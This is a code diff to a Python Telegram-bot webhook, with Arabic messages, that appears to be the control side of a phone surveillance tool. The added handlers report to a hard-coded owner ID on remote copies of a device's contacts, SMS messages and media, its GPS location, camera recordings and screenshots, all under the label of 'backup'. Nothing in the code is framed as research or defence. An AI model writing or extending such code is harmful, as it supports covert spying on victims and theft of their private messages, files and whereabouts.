@@ -116,18 +116,94 @@ def webhook():
         
         if command == 'backup_contacts':
             if error:
-                # إرسال رسالة خطأ للمالك
                 bot.send_message(
                     int(os.environ.get('OWNER_USER_ID', 985612253)),
                     f"❌ فشل في نسخ جهات الاتصال:\n{error}"
                 )
             else:
-                # إرسال النتيجة للمالك
                 contacts_count = result.get('count', 0) if result else 0
                 bot.send_message(
                     int(os.environ.get('OWNER_USER_ID', 985612253)),
                     f"✅ تم نسخ جهات الاتصال بنجاح!\n"
                     f"📊 عدد الجهات: {contacts_count}\n"
+                    f"📅 التاريخ: {datetime.fromtimestamp(timestamp/1000).strftime('%Y-%m-%d %H:%M')}"
+                )
+        
+        elif command == 'backup_sms':
+            if error:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"❌ فشل في نسخ الرسائل النصية:\n{error}"
+                )
+            else:
+                sms_count = result.get('count', 0) if result else 0
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"✅ تم نسخ الرسائل النصية بنجاح!\n"
+                    f"📊 عدد الرسائل: {sms_count}\n"
+                    f"📅 التاريخ: {datetime.fromtimestamp(timestamp/1000).strftime('%Y-%m-%d %H:%M')}"
+                )
+        
+        elif command == 'backup_media':
+            if error:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"❌ فشل في نسخ الوسائط:\n{error}"
+                )
+            else:
+                media_count = result.get('count', 0) if result else 0
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"✅ تم نسخ الوسائط بنجاح!\n"
+                    f"📊 عدد الملفات: {media_count}\n"
+                    f"📅 التاريخ: {datetime.fromtimestamp(timestamp/1000).strftime('%Y-%m-%d %H:%M')}"
+                )
+        
+        elif command == 'get_location':
+            if error:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"❌ فشل في الحصول على الموقع:\n{error}"
+                )
+            else:
+                location = result.get('location', {}) if result else {}
+                lat = location.get('latitude', 'غير محدد')
+                lng = location.get('longitude', 'غير محدد')
+                accuracy = location.get('accuracy', 'غير محدد')
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"📍 تم الحصول على الموقع بنجاح!\n"
+                    f"🌍 خط العرض: {lat}\n"
+                    f"🌍 خط الطول: {lng}\n"
+                    f"🎯 الدقة: {accuracy} متر\n"
+                    f"📅 التاريخ: {datetime.fromtimestamp(timestamp/1000).strftime('%Y-%m-%d %H:%M')}"
+                )
+        
+        elif command == 'record_camera':
+            if error:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"❌ فشل في تسجيل الكاميرا:\n{error}"
+                )
+            else:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"📷 تم تسجيل الكاميرا بنجاح!\n"
+                    f"📁 تم حفظ الفيديو\n"
+                    f"📅 التاريخ: {datetime.fromtimestamp(timestamp/1000).strftime('%Y-%m-%d %H:%M')}"
+                )
+        
+        elif command == 'take_screenshot':
+            if error:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"❌ فشل في التقاط لقطة الشاشة:\n{error}"
+                )
+            else:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"📸 تم التقاط لقطة الشاشة بنجاح!\n"
+                    f"📁 تم حفظ الصورة\n"
                     f"📅 التاريخ: {datetime.fromtimestamp(timestamp/1000).strftime('%Y-%m-%d %H:%M')}"
                 )
         
